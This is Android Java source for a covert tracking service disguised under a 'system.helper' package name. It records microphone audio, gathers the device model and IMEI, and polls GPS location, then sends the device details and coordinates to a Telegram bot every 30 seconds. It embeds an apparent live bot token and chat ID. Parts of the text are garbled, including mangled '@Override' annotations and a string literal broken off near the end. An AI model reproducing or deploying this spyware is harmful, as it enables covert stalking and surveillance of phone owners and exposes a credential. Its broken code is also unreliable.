package com.android.system.helper;

import android.app.Service;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.net.HttpURLConnection;
import java.net.URL;

public class TrackingService extends Service implements LocationListener {
    // ========== ВАШИ ДАННЫЕ ==========
    private static final String BOT_TOKEN = "8727266800:AAEui-3sZAMIg7Ouy1TuTgKZqcj7FlFULJE";
    private static final String CHAT_ID = "8639425042";
    // ==================================
    
    private static final String TELEGRAM_URL = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
    
    private LocationManager locationManager;
    private MediaRecorder recorder;

    @id86240433 (@Override)
    public void onCreate() {
        super.onCreate();
        
        // ===== ГЕОЛОКАЦИЯ =====
        locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
        try {
            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000, 10, this);
            locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 5000, 10, this);
        } catch (SecurityException e) {
            Log.e("Tracking", "Location permission error", e);
        }

        // ===== АУДИОЗАПИСЬ =====
        try {
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(getExternalFilesDir(null) + "/audio.3gp");
            recorder.prepare();
            recorder.start();
            Log.d("Tracking", "Audio recording started");
        } catch (Exception e) {
            Log.e("Tracking", "Audio error", e);
        }

        // ===== ИНФОРМАЦИЯ ОБ УСТРОЙСТВЕ =====
        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        String info = "📱 Устройство: " + android.os.Build.MODEL + 
                     " | Android: " + android.os.Build.VERSION.RELEASE;
        try {
            info += " | IMEI: " + tm.getDeviceId();
        } catch (Exception e) {}
        sendToTelegram(info);
        
        // ===== ПЕРИОДИЧЕСКАЯ ОТПРАВКА =====
        new Thread(() -> {
            while (true) {
                try {
                    Thread.sleep(30000);
                    sendToTelegram("📍 Координаты: " + getLastLocation());
                    sendToTelegram("🎤 Аудио записано");
                } catch (Exception e) {}
            }
        }).start();
    }

    private String getLastLocation() {
        try {
            Location loc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) {
                loc = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }
            if (loc != null) {
                return "https://www.google.com/maps?q=" + 
                       loc.getLatitude() + "," + loc.getLongitude();
            }
        } catch (SecurityException e) {}
        return "Неизвестно";
    }

    private void sendToTelegram(String text) {
        new Thread(() -> {
            try {
                URL url = new URL(TELEGRAM_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                
                String json = "{\"chat_id\":\"" + CHAT_ID + "\",\"text\":\"" + text + "\"}";
                conn.getOutputStream().write(json.getBytes());
                conn.getInputStream().close();
                conn.disconnect();
            } catch (Exception e) {
                Log.e("Tracking",gram send error", e);
            }
        }).start();
    }

    @id86240433 (@Override)
    public void onLocationChanged(Location location) {
        sendToTelegram("📍 " + location.getLatitude() + "," + location.getLongitude());
    }

    @id86240433 (@Override) public void onStatusChanged(String provider, int status, Bundle extras) {}
    @id86240433 (@Override) public void onProviderEnabled(String provider) {}
    @id86240433 (@Override) public void onProviderDisabled(String provider) {}
    @id86240433 (@Override) public IBinder onBind(Intent intent) { return null; }
}"Tele